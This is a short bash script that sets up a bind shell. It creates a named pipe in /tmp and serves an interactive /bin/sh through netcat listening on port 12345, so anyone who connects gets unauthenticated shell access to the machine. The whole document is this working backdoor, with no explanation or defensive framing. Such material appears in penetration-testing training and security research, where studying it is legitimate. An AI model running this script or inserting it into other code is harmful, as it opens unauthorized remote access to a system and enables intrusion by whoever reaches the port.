#!/bin/bash

port=12345
pipe=/tmp/bindsh

rm $pipe
mkfifo $pipe
cat $pipe | /bin/sh -i 2>&1 | nc -l $port > $pipe
